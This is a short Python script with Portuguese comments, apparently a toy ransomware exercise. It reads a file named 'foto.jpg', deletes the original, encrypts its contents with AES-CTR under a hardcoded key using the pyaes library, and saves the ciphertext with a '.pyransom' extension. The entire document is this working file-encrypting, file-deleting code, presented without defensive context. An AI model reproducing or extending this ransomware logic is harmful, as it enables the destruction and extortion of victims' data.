#importando funções do sistema operacional
import os
#importando lib de criptografia
import pyaes

#para abrir o arquivo desejado
file_name = "foto.jpg"
file = open(file_name, "rb")
file_data = file.read()
print(repr(file_data))
file.close()


#para remover o arquivo
os.remove(file_name)

#chave para criptografar
key = "0143256789fravtr"
#criptografando o arquivo
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = aes.encrypt(file_data)

#gerando novo arquivo criptografado
new_file_name = file_name + ".pyransom"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()